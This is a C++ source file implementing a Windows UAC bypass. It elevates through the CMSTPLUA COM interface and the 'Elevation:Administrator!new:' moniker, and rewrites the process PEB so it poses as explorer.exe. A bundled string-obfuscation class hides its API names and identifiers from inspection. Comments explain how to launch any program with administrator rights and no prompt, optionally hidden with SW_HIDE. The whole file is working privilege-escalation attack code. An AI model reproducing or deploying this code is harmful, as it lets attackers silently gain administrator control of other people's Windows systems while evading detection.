#define _CRT_SECURE_NO_WARNINGS
#include <combaseapi.h>
#include <ntstatus.h>
#include <shlobj.h>
#include <tchar.h>
#include <type_traits>

namespace skc {
	template<class _Ty>
	using clean_type = typename std::remove_const_t<std::remove_reference_t<_Ty>>;

	template <int _size, char _key1, char _key2, typename T>
	class skCrypter
	{
	public:
		__forceinline constexpr skCrypter(T* data)
		{
			crypt(data);
		}

		__forceinline T* get()
		{
			return _storage;
		}

		__forceinline int size() // (w)char count
		{
			return _size;
		}

		__forceinline  char key()
		{
			return _key1;
		}

		__forceinline  T* encrypt()
		{
			if (!isEncrypted())
				crypt(_storage);

			return _storage;
		}

		__forceinline  T* decrypt()
		{
			if (isEncrypted())
				crypt(_storage);

			return _storage;
		}

		__forceinline bool isEncrypted()
		{
			return _storage[_size - 1] != 0;
		}

		__forceinline void clear() // set full storage to 0
		{
			for (int i = 0; i < _size; i++)
			{
				_storage[i] = 0;
			}
		}

		__forceinline operator T* ()
		{
			decrypt();

			return _storage;
		}

	private:
		__forceinline constexpr void crypt(T* data)
		{
			for (int i = 0; i < _size; i++)
			{
				_storage[i] = data[i] ^ (_key1 + i % (1 + _key2));
			}
		}

		T _storage[_size]{};
	};
}

#define skCrypt(str) skCrypt_key(str, __TIME__[4], __TIME__[7])
#define skCrypt_key(str, key1, key2) []() { \
			constexpr static auto crypted = skc::skCrypter \
				<sizeof(str) / sizeof(str[0]), key1, key2, skc::clean_type<decltype(str[0])>>((skc::clean_type<decltype(str[0])>*)str); \
					return crypted; }()

#pragma comment(lib, "Ole32.lib")

#define UCM_DEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
     EXTERN_C const GUID DECLSPEC_SELECTANY name \
                = { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }  

UCM_DEFINE_GUID(IID_ICMUACUtil, 0x6EDD6D74, 0xC007, 0x4E75, 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C);

typedef interface ICMUACUtil ICMUACUtil;

typedef struct ICMUACUtilVtbl {
	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE* QueryInterface)(__RPC__in ICMUACUtil* This, __RPC__in REFIID riid, _COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(__RPC__in ICMUACUtil* This);

	ULONG(STDMETHODCALLTYPE* Release)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* SetRasCredentials)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* SetRasEntryProperties)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* DeleteRasEntry)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* LaunchInfSection)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* LaunchInfSectionEx)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* CreateLayerDirectory)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* ShellExec)(__RPC__in ICMUACUtil* This, _In_ LPCTSTR lpFile, _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ ULONG fMask, _In_ ULONG nShow);

	END_INTERFACE

} *PICMUACUtilVtbl;

interface ICMUACUtil { CONST_VTBL struct ICMUACUtilVtbl* lpVtbl; };

// CoGetObject elevation as an admininistrator
HRESULT ucmAllocateElevatedObject(_In_ LPWSTR lpObjectCLSID, _In_ REFIID riid, _In_ DWORD dwClassContext, _Outptr_ void** ppv) {
	BOOL        bCond = FALSE;
	DWORD       classContext;
	HRESULT     hr = E_FAIL;
	PVOID       ElevatedObject = NULL;

	BIND_OPTS3  bop;
	WCHAR       szMoniker[MAX_PATH];

	do {
		if (wcslen(lpObjectCLSID) > 64) break;

		RtlSecureZeroMemory(&bop, sizeof(bop));
		bop.cbStruct = sizeof(bop);

		classContext = dwClassContext;
		if (dwClassContext == 0) classContext = CLSCTX_LOCAL_SERVER;

		bop.dwClassContext = classContext;

		wcscpy_s(szMoniker, skCrypt(L"Elevation:Administrator!new:"));
		wcscat_s(szMoniker, lpObjectCLSID);

		hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);

	} while (bCond);

	*ppv = ElevatedObject;

	return hr;
}

// Bypass UAC
BOOL MaskPEB() {
	typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR  Buffer; }
	UNICODE_STRING, * PUNICODE_STRING;

	typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		DWORD ProcessInformationLength,
		PDWORD ReturnLength
		);

	typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(PRTL_CRITICAL_SECTION CriticalSection);

	typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(PRTL_CRITICAL_SECTION CriticalSection);

	typedef void (WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

	typedef struct _LIST_ENTRY {
		struct _LIST_ENTRY* Flink;
		struct _LIST_ENTRY* Blink;
	} LIST_ENTRY, * PLIST_ENTRY;

	typedef struct _PROCESS_BASIC_INFORMATION {
		LONG ExitStatus;
		PVOID PebBaseAddress;
		ULONG_PTR AffinityMask;
		LONG BasePriority;
		ULONG_PTR UniqueProcessId;
		ULONG_PTR ParentProcessId;
	} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		HANDLE SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID EntryInProgress;
		BOOLEAN ShutdownInProgress;
		HANDLE ShutdownThreadId;
	} PEB_LDR_DATA, * PPEB_LDR_DATA;

	typedef struct _RTL_USER_PROCESS_PARAMETERS {
		BYTE           Reserved1[16];
		PVOID          Reserved2[10];
		UNICODE_STRING ImagePathName;
		UNICODE_STRING CommandLine;
	} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

	// Partial PEB
	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		union {
			BOOLEAN BitField;
			struct {
				BOOLEAN ImageUsesLargePages : 1;
				BOOLEAN IsProtectedProcess : 1;
				BOOLEAN IsLegacyProcess : 1;
				BOOLEAN IsImageDynamicallyRelocated : 1;
				BOOLEAN SkipPatchingUser32Forwarders : 1;
				BOOLEAN SpareBits : 3;
			};
		};
		HANDLE Mutant;

		PVOID ImageBaseAddress;
		PPEB_LDR_DATA Ldr;
		PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
		PVOID SubSystemData;
		PVOID ProcessHeap;
		PRTL_CRITICAL_SECTION FastPebLock;
	} PEB, * PPEB;

	typedef struct _LDR_DATA_TABLE_ENTRY {
		LIST_ENTRY InLoadOrderLinks;
		LIST_ENTRY InMemoryOrderLinks;
		union {
			LIST_ENTRY InInitializationOrderLinks;
			LIST_ENTRY InProgressLinks;
		};
		PVOID DllBase;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		WORD LoadCount;
		WORD TlsIndex;
		union {
			LIST_ENTRY HashLinks;
			struct { PVOID SectionPointer; ULONG CheckSum; };
		};
		union {
			ULONG TimeDateStamp;
			PVOID LoadedImports;
		};
	} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

	DWORD dwPID;
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	PPEB_LDR_DATA pld;
	PLDR_DATA_TABLE_ENTRY ldte;

	HMODULE hNtdll = GetModuleHandle(skCrypt(L"ntdll.dll"));

	_NtQueryInformationProcess NtQueryInformationProcess =
		(_NtQueryInformationProcess)GetProcAddress(hNtdll, skCrypt("NtQueryInformationProcess"));
	if (NtQueryInformationProcess == NULL) return FALSE;

	_RtlEnterCriticalSection RtlEnterCriticalSection =
		(_RtlEnterCriticalSection)GetProcAddress(hNtdll, skCrypt("RtlEnterCriticalSection"));
	if (RtlEnterCriticalSection == NULL) return FALSE;

	_RtlLeaveCriticalSection RtlLeaveCriticalSection =
		(_RtlLeaveCriticalSection)GetProcAddress(hNtdll, skCrypt("RtlLeaveCriticalSection"));
	if (RtlLeaveCriticalSection == NULL) return FALSE;

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(hNtdll, skCrypt("RtlInitUnicodeString"));
	if (RtlInitUnicodeString == NULL) return FALSE;

	dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE) return FALSE;

	// Retrieves information about the specified process.
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	// Read pbi PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) return FALSE;

	// Read Ldr Address into PEB_LDR_DATA Structure
	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) return FALSE;

	// Overwrite UNICODE_STRING structs in memory

	// First set Explorer.exe location buffer
	WCHAR chExplorer[MAX_PATH + 1];
	GetWindowsDirectory(chExplorer, MAX_PATH);
	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
	wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

	// Take ownership of PEB
	RtlEnterCriticalSection(peb->FastPebLock);

	// Mask ImagePathName and CommandLine 
	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

	// Mask FullDllName and BaseDllName
	WCHAR wFullDllName[MAX_PATH];
	WCHAR wExeFileName[MAX_PATH];
	GetModuleFileName(NULL, wExeFileName, MAX_PATH);

	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
	do {
		// Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) return FALSE;

		// Read FullDllName into string
		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
			return FALSE;

		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
			RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
			RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
			break;
		}

		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

	} while (pNextModuleInfo != pStartModuleInfo);

	// Release ownership of PEB
	RtlLeaveCriticalSection(peb->FastPebLock);

	// Release Process Handle
	CloseHandle(hProcess);

	if (_wcsicmp(chExplorer, wFullDllName) == 0) return FALSE;

	return TRUE;
}

NTSTATUS UACShellExec(_In_ LPCTSTR lpszExecutable, LPCTSTR execParameters, ULONG nShow) {
	NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
	HRESULT          r = E_FAIL, hr_init;
	BOOL             bApprove = FALSE;
	ICMUACUtil* CMUACUtil = NULL;

	hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

	do {
		r = ucmAllocateElevatedObject(
			(LPWSTR)skCrypt(L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"),
			IID_ICMUACUtil,
			CLSCTX_LOCAL_SERVER,
			(void**)&CMUACUtil);

		if (r != S_OK) break;

		if (CMUACUtil == NULL) {
			r = E_OUTOFMEMORY;
			break;
		}

		r = CMUACUtil->lpVtbl->ShellExec(CMUACUtil,
			lpszExecutable,
			execParameters,
			NULL,
			SEE_MASK_DEFAULT,
			nShow);

		if (SUCCEEDED(r)) MethodResult = STATUS_SUCCESS;

	} while (FALSE);

	if (CMUACUtil != NULL) CMUACUtil->lpVtbl->Release(CMUACUtil);

	if (hr_init == S_OK) CoUninitialize();

	return MethodResult;
}

// Using WinMain instead of main & ShowWindow because this way it won't popup a cmd for a split second
int WINAPI main(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow) {
	if (!MaskPEB()) return 0; // If something goes wrong in the bypass, exit
	// The first parameter of UACShellExec is the application you want to run, in this case "cmd"
	// The second one are the parameters you want to run the application with, in this case "nullptr"
	// The third one can be SW_HIDE / SW_SHOW, depending on your needs. SW_SHOW will simply show the application, SW_HIDE will hide it with no popup
	UACShellExec(L"C:\\Users\\dsfds\\Desktop\\putty.exe", nullptr, SW_SHOW);
	return 0;
}
